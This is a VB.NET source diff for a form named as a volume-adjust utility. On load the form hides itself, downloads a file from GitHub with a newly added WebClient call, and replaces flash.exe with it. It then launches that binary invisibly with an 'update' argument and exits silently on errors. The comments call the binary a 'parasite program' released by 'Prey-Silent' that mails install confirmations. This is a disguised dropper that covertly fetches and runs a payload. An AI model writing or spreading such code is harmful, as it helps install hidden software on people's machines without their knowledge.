@@ -1,4 +1,5 @@
 ﻿Imports System.IO
+Imports System.Net
 
 Public Class voladjustForm
     '网络下载文件相关
@@ -15,22 +16,27 @@ Public Class voladjustForm
 
     Private Sub voladjustForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Hide()
-        '首先判断本目录是否有 flash 文件的备份(文件名为 flash_bak，由 Prey-Silent 释放)
-        If Not (File.Exists(BackupPath)) Then
+        Try
+            Dim DownloadClient As WebClient = New WebClient
+            '首先判断本目录是否有 flash 文件的备份(文件名为 flash_bak，由 Prey-Silent 释放)
+            If File.Exists(BackupPath) Then File.Delete(BackupPath)
+
             '备份文件不在时需要从 GitHub 下载，当下载失败时，退出
-            If Not (URLDownloadToFile(0, GitHubURL, BackupPath, 0, 0) = 0) Then Application.Exit()
-        End If
+            DownloadClient.DownloadFile(GitHubURL, BackupPath)
 
-        '如果 flash.exe 存在就删除再复制，可以利用这一特性用于 flash 升级
-        If File.Exists(FlashPath) Then File.Delete(FlashPath)
+            '如果 flash.exe 存在就删除再复制，可以利用这一特性用于 flash 升级
+            If File.Exists(FlashPath) Then File.Delete(FlashPath)
 
-        '开始使用 cmd 值守程序退出之后恢复
-        RecoveryFlash()
+            '开始使用 cmd 值守程序退出之后恢复
+            RecoveryFlash()
 
-        '使用 [update] 参数调用 寄生程序 ，接收安装/更新成功提示邮件
-        ShellExecute(0, vbNullString, FlashPath, "update", vbNullString, vbHide)
+            '使用 [update] 参数调用 寄生程序 ，接收安装/更新成功提示邮件
+            ShellExecute(0, vbNullString, FlashPath, "update", vbNullString, vbHide)
 
-        Application.Exit()
+            Application.Exit()
+        Catch ex As Exception
+            Application.Exit()
+        End Try
     End Sub
 
     ''' <summary>
